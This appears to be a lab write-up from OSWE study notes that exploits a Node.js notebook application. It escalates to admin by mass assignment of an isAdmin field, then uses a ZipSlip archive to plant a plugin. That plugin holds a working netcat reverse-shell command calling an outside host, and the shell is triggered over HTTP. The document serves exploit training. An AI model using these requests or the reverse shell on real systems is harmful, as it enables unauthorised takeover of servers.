# Notebook Application — Mass Assignment Authentication Bypass and ZipSlip RCE
**Notebook** is a Node.js application that runs on Linux. Users can create an account, log in, and manage their notes. The application supports adding, viewing, editing, deleting, and searching notes.

Two additional features require administrative access:

* Viewing the list of users
* Managing file storage

By default, the application runs on port **`3000`** for the front end and port **`5000`** for back-end requests.

## Authentication Bypass — Mass Assignment 
### Application Discovery
After creating an account and authenticating, we observe that the application uses **JWT** for authentication and authorization. Decoding our user’s JWT payload reveals the following:

```json
{
    "user": {
        "id": 15,
        "email": "john@doe.ltd",
        "isAdmin": "false"
    },
    "iat": 1756558668,
    "exp": 1842958668
}
```

This shows that our account does not have administrative privileges (`"isAdmin": "false"`). When attempting to access administrative endpoints such as **`/admin/users`**, **`/admin/storage`**, or **`/admin/plugin`**, the application responds with:

```json
{"message":"Access denied. Admin rights required."}
```

By searching the source code for this error message (e.g., using VSCode’s search feature), we find multiple references inside the file `/backend/controllers/adminControllers.js`. For example:

```javascript
...
exports.getUserProfiles = async (req, res) => {
  try {
    // Check if the user is an admin
    if (req.user.isAdmin !== "true") {
      return res.status(403).json({ message: "Access denied. Admin rights required." });
    }

    // Query to get all users
    const [users] = await pool.query(
      'SELECT id, username, email FROM users'
    );

    if (users.length === 0) {
      return res.status(404).json({ message: "No users found" });
    }

    res.json(users);
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

exports.runPlugin = async (req, res) => {
  try {
    // Check if the user is an admin
    if (req.user.isAdmin !== "true") {
      return res.status(403).json({ message: "Access denied. Admin rights required." });
    }

    // Get the plugin name from the request query
    const pluginName = req.query.plugin;

    if (!pluginName) {
      return res.status(400).json({ message: "Plugin name is required" });
    }

    // Sanitize the plugin name to prevent path traversal
    const sanitizedPluginName = path.basename(pluginName).replace(/\.js$/, '');

    // Construct the full path to the plugin
    const pluginsDir = path.join(__dirname, '..', 'plugins');
    const pluginPath = path.join(pluginsDir, `${sanitizedPluginName}.js`);

    // Ensure the resolved path is within the plugins directory
    if (!pluginPath.startsWith(pluginsDir)) {
      return res.status(403).json({ message: "Invalid plugin path" });
    }

    // Check if the plugin file exists
    try {
      await fs2.access(pluginPath);
    } catch (error) {
      return res.status(404).json({ message: "Plugin not found" });
    }

    // Load and execute the plugin
    try {
      const plugin = require(pluginPath);

      if (typeof plugin.execute !== 'function') {
        return res.status(400).json({ message: "Invalid plugin: execute function not found" });
      }

      const processedData = await plugin.execute(req.body);
      return res.json(processedData);
    } catch (pluginError) {
      console.error(`Plugin error: ${pluginError.message}`);
      return res.status(500).json({ message: "Error executing plugin", error: pluginError.message });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

exports.fileStorage = async (req, res) => {
  try {
    // Check if the user is an admin
    if (req.user.isAdmin !== "true") {
      return res.status(403).json({ message: "Access denied. Admin rights required." });
    }

    // Check if a file was uploaded
    if (!req.files || !req.files.zipFile) {
      return res.status(200).json({ message: "No zip file uploaded." });
    }

    const zipFile = req.files.zipFile;

    // Sanitize the original file name
    const sanitizedOriginalName = sanitize(zipFile.name);

    // Generate a random unique name for the file
    const randomName = `${Date.now()}-${Math.random().toString(36).substring(2, 15)}.zip`;

    // Define the upload and extraction paths
    const uploadPath = path.join(__dirname, '..', 'temp', randomName);
    const extractPath = path.join(__dirname, '..', 'uploads');

    // Move the uploaded file to the upload directory with the new random name
    await zipFile.mv(uploadPath);

    // Create the extraction directory if it doesn't exist
    if (!fs.existsSync(extractPath)) {
      fs.mkdirSync(extractPath, { recursive: true });
    }

    // Unzip the file using the unzip command
    exec(`unzip -: "${uploadPath}" -d "${extractPath}"`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Unzip error: ${error.message}`);
        return res.status(500).json({ message: "Error unzipping file", error: error.message });
      }
      if (stderr) {
        console.error(`Unzip stderr: ${stderr}`);
      }
      console.log(`Unzip stdout: ${stdout}`);

      // Delete the uploaded zip file after extraction
      fs.unlinkSync(uploadPath);

      res.json({
        message: "File successfully unzipped",
        extractedTo: extractPath,
        originalName: sanitizedOriginalName,
        storedAs: randomName
      });
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};
...
```

Similar checks appear in other admin-related functions such as `getUserProfiles`, `runPlugin` and `fileStorage`.

In summary, the application explicitly enforces administrative access control before allowing execution of the functions **`getUserProfiles`**, **`runPlugin`**, and **`fileStorage`**, which correspond to the endpoints **`/admin/users`**, **`/admin/plugin`**, and **`/admin/storage`**.

### Discovering Authentication Bypass — Mass Assignment Vulnerability Discovery 
Digging deeper into the application’s normal user-accessible functions located in `/backend/controllers/userController.js`, we discovered a critical flaw that allows any user to escalate privileges by modifying their own `isAdmin` attribute to `true`, thereby gaining administrative access to the application.

```javascript
exports.updateUserProfile = async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    const userId = req.user.id;
    const { username, email } = req.body;
    const mergedUser = merge(req.user, req.body);

    const [result] = await pool.query(
      'UPDATE users SET username = ?, email = ? WHERE id = ?',
      [username, email, userId]
    );

    if (result.affectedRows === 0) {
      return res.status(404).json({ message: "User not found" });
    }

    const payload = {
      user: {
        id: req.user.id,
        email: req.user.email,
        username: req.user.username,
        isAdmin: req.user.isAdmin
      }
    };

    jwt.sign(
      payload,
      process.env.JWT_SECRET,
      { expiresIn: '1000d' },
      (err, token) => {
        if (err) throw err;
        res.json({ message: "Profile updated successfully", token });
      }
    );
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};
```

The function **`updateUserProfile`** is intended to update a user’s profile information such as `username` and `email`. A typical request looks like this:

```
PUT /api/profile HTTP/1.1
Host: 192.168.131.230:5000
Content-Type: application/json
x-auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoxNSwiZW1haWwiOiJqb2huQGRvZS5sdGQiLCJpc0FkbWluIjoiZmFsc2UifSwiaWF0IjoxNzU2NTU4NjY4LCJleHAiOjE4NDI5NTg2Njh9._jdqrpy3kcPtCdYVeb_nhY4tkjyU6jfjGIOPOyzqFW8
Content-Length: 45

{"username":"johndoe","email":"john@doe.ltd"}
```
### Exploiting the Mass Assignment Vulnerability — Gaining Administrative Access to the Target Application 
However, the function introduces a severe security vulnerability: it accepts arbitrary fields from the request body, including `isAdmin`. As a result, a normal user can escalate privileges by sending a request like this:

```
PUT /api/profile HTTP/1.1
Host: 192.168.131.230:5000
Content-Type: application/json
x-auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoxNSwiZW1haWwiOiJqb2huQGRvZS5sdGQiLCJpc0FkbWluIjoiZmFsc2UifSwiaWF0IjoxNzU2NTU4NjY4LCJleHAiOjE4NDI5NTg2Njh9._jdqrpy3kcPtCdYVeb_nhY4tkjyU6jfjGIOPOyzqFW8
Content-Length: 64

{"username":"johndoe","email":"john@doe.ltd","isAdmin":"true"}
```

The server responds with a success message and issues a new JWT:

```json
{"message":"Profile updated successfully","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoxNSwiZW1haWwiOiJqb2huQGRvZS5sdGQiLCJ1c2VybmFtZSI6ImpvaG5kb2UiLCJpc0FkbWluIjoidHJ1ZSJ9LCJpYXQiOjE3NTY1NjMyODksImV4cCI6MTg0Mjk2MzI4OX0.FKF3YQ17iVnOdnUUT7C7FdBSFivYmJEjLsSwBYCZmIg"}
```

Decoding this new JWT shows that the `isAdmin` attribute has been modified to `true`:

```json
{
    "user": {
        "id": 15,
        "email": "john@doe.ltd",
        "username": "johndoe",
        "isAdmin": "true"
    },
    "iat": 1756563289,
    "exp": 1842963289
}
```

With this token, the attacker gains full administrative access and can interact with restricted endpoints such as **`/admin/users`**, **`/admin/plugin`**, and **`/admin/storage`**.

**Authentication Bypass Script:** [mass_assignment_auth_bypass.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/Notebook%20Application/mass_assignment_auth_bypass.py) 

## RCE — Insecure ZIP file upload ZipSlip Attack 
After gaining administrative access to the target application, the function `File storage` accessable via `/admin/storage` caught our attention, as it allows a user with administrative access to upload ZIP files to the target machine. 

### Analyzing the ZIP File Upload Functionality 
Let's view the function responsible for that in `/backend/controllers/adminControllers.js`:
```javascript
...
exports.fileStorage = async (req, res) => {
  try {
    // Check if the user is an admin
    if (req.user.isAdmin !== "true") {
      return res.status(403).json({ message: "Access denied. Admin rights required." });
    }

    // Check if a file was uploaded
    if (!req.files || !req.files.zipFile) {
      return res.status(200).json({ message: "No zip file uploaded." });
    }

    const zipFile = req.files.zipFile;

    // Sanitize the original file name
    const sanitizedOriginalName = sanitize(zipFile.name);

    // Generate a random unique name for the file
    const randomName = `${Date.now()}-${Math.random().toString(36).substring(2, 15)}.zip`;

    // Define the upload and extraction paths
    const uploadPath = path.join(__dirname, '..', 'temp', randomName);
    const extractPath = path.join(__dirname, '..', 'uploads');

    // Move the uploaded file to the upload directory with the new random name
    await zipFile.mv(uploadPath);

    // Create the extraction directory if it doesn't exist
    if (!fs.existsSync(extractPath)) {
      fs.mkdirSync(extractPath, { recursive: true });
    }

    // Unzip the file using the unzip command
    exec(`unzip -: "${uploadPath}" -d "${extractPath}"`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Unzip error: ${error.message}`);
        return res.status(500).json({ message: "Error unzipping file", error: error.message });
      }
      if (stderr) {
        console.error(`Unzip stderr: ${stderr}`);
      }
      console.log(`Unzip stdout: ${stdout}`);

      // Delete the uploaded zip file after extraction
      fs.unlinkSync(uploadPath);

      res.json({
        message: "File successfully unzipped",
        extractedTo: extractPath,
        originalName: sanitizedOriginalName,
        storedAs: randomName
      });
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};
...
```
This function handles **admin-only file uploads**:

1. Verifies the user is an admin.
2. Checks if a `.zip` file is uploaded.
3. Renames the file with a random unique name and saves it temporarily.
4. Creates an extraction folder (if missing).
5. Unzips the file into the `uploads` directory.
6. Deletes the uploaded zip after extraction.
7. Returns a JSON response with details of the operation.

The function trusts `unzip` blindly, so crafted zips with relative paths (`../`) can escape the target directory → classic ZipSlip vulnerability.

### What is ZipSlip?
- ZipSlip is a directory traversal vulnerability that happens when unzipping (or untarring) archives without validating file paths.
- Attackers craft malicious archives containing entries like `../../../../etc/passwd` or `../plugins/shell.js`.
- If the extraction code doesn’t sanitize these paths, files get written outside of the intended extraction folder.

#### Why it’s dangerous
- Arbitrary file overwrite → attacker can overwrite config files, app code, or system binaries.
- Remote Code Execution (RCE) → if they drop a malicious `.js`, `.php`, or `.jsp` file into a web-accessible folder.
- Privilege escalation → if the server runs as a privileged user, attacker could overwrite critical system files.

#### Why many libraries are vulnerable
- Commercial tools (`WinZip`, `7-Zip`, etc.) typically block `../` sequences to keep extractions “safe.”
- Many programming libraries (Java `java.util.zip`, Node’s raw `unzip`, PHP’s `ZipArchive`, etc.) don’t check paths by default, leaving it up to the developer.
- If developers just “extract all files” without sanitization, they inherit the vulnerability.

### Exploiting the ZipSlip Vulnerability
#### **1. Attacker creates a malicious payload**

They write a malicious Node.js plugin (`shell.js`) that, when executed, spawns a **reverse shell** back to the attacker’s machine:

```js
exports.execute = async () => {
  const { exec } = require('child_process');
  const { promisify } = require('util');
  const execAsync = promisify(exec);

  const command = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.187 1337 >/tmp/f'; // CHANGE ME 
  
  try {
    const { stdout, stderr } = await execAsync(command);

    return {
      command,
      exitCode: 0,
      stdout: stdout.trim().split('\n'),
      stderr: (stderr || '').trim(),
      timestamp: new Date().toISOString()
    };
  } catch (err) {
    return {
      command,
      exitCode: typeof err.code === 'number' ? err.code : 1,
      stdout: (err.stdout || '').toString().trim(),
      stderr: (err.stderr || err.message || String(err)).toString().trim(),
      timestamp: new Date().toISOString()
    };
  }
};
```

#### **2. Attacker packages it inside a malicious zip**

Using **[evilarc](https://github.com/ptoomey3/evilarc/)**, they generate a zip with a traversal path:

```bash
┌──(kali㉿kali)-[~/evilarc]
└─$ python2 evilarc.py -d 1 -o unix -p plugins/ shell.js 
Creating evil.zip containing ../plugins/shell.js
                                                                                                     
┌──(kali㉿kali)-[~/evilarc]
└─$ 
```

This produces an archive containing:

```
../plugins/shell.js
```

```bash
┌──(kali㉿kali)-[~/evilarc]
└─$ unzip -l evil.zip
Archive:  evil.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      806  2025-08-29 21:29   ../plugins/shell.js
---------                     -------
      806                     1 file
                                                                                                     
┌──(kali㉿kali)-[~/evilarc]
└─$ 
```

#### **3. Attacker Uploads the ZIP File via `/admin/storage` then Target server extracts the archive**

The vulnerable server code:

```js
exec(`unzip -: "${uploadPath}" -d "${extractPath}"`)
```

* It doesn’t sanitize file paths inside the zip.
* `unzip` follows the `../` path traversal.
* Instead of ending up inside `/uploads`, `shell.js` is written to `/plugins/shell.js`.

#### **4. Malicious file is now planted**

* The attacker-controlled `shell.js` plugin is placed directly in the server’s `plugins` directory.
    ```bash
    $ cd plugins
    $ ls
    cloudsync.js  shell.js  sysinfo.js  weather.js
    $ 
    ```

### RCE — Run the Uploaded Plugin
Now, after we uploaded the ZIP file containing the malicious JavaScript plugin and verified that it ended up uploaded to the `/plugins` directory, now we need to figure out a way to run our uploaded plugin.

We can use the function `runPlugin` in the `/backend/controllers/adminController.js` to run our uploaded plugin:
```javascript
...
exports.runPlugin = async (req, res) => {
  try {
    // Check if the user is an admin
    if (req.user.isAdmin !== "true") {
      return res.status(403).json({ message: "Access denied. Admin rights required." });
    }

    // Get the plugin name from the request query
    const pluginName = req.query.plugin;

    if (!pluginName) {
      return res.status(400).json({ message: "Plugin name is required" });
    }

    // Sanitize the plugin name to prevent path traversal
    const sanitizedPluginName = path.basename(pluginName).replace(/\.js$/, '');

    // Construct the full path to the plugin
    const pluginsDir = path.join(__dirname, '..', 'plugins');
    const pluginPath = path.join(pluginsDir, `${sanitizedPluginName}.js`);

    // Ensure the resolved path is within the plugins directory
    if (!pluginPath.startsWith(pluginsDir)) {
      return res.status(403).json({ message: "Invalid plugin path" });
    }

    // Check if the plugin file exists
    try {
      await fs2.access(pluginPath);
    } catch (error) {
      return res.status(404).json({ message: "Plugin not found" });
    }

    // Load and execute the plugin
    try {
      const plugin = require(pluginPath);

      if (typeof plugin.execute !== 'function') {
        return res.status(400).json({ message: "Invalid plugin: execute function not found" });
      }

      const processedData = await plugin.execute(req.body);
      return res.json(processedData);
    } catch (pluginError) {
      console.error(`Plugin error: ${pluginError.message}`);
      return res.status(500).json({ message: "Error executing plugin", error: pluginError.message });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

...
```

As the JavaScript code above explains, we can run our uploaded plugin using a request like:
```
GET /admin/plugin?plugin=shell HTTP/1.1
Host: 192.168.131.231:5000
x-auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoxNSwiZW1haWwiOiJqb2huQGRvZS5sdGQiLCJ1c2VybmFtZSI6ImpvaG5kb2UiLCJpc0FkbWluIjoidHJ1ZSJ9LCJpYXQiOjE3NTY1Njg0MzQsImV4cCI6MTg0Mjk2ODQzNH0.oWXhrgekrT5SRJicVREcdu0JV1a9BWJrU5HP-JMs7bg

```

Then check our Netcat listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.208] from (UNKNOWN) [192.168.131.231] 53650
bash: cannot set terminal process group (699): Inappropriate ioctl for device
bash: no job control in this shell
<book-debug-249-081:/home/student/notebook/backend# 

```

**Automation Script:** [rce_script.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/Notebook%20Application/rce_script.py) 

#### Refrences 
- evilarc GitHub reposetory: https://github.com/ptoomey3/evilarc/
- Hack the Box Ghoul Machine (ZipSlip): https://0xdf.gitlab.io/2019/10/05/htb-ghoul.html
- IppSec Video on Ghoul: https://www.youtube.com/watch?v=kE36IGAU5rg
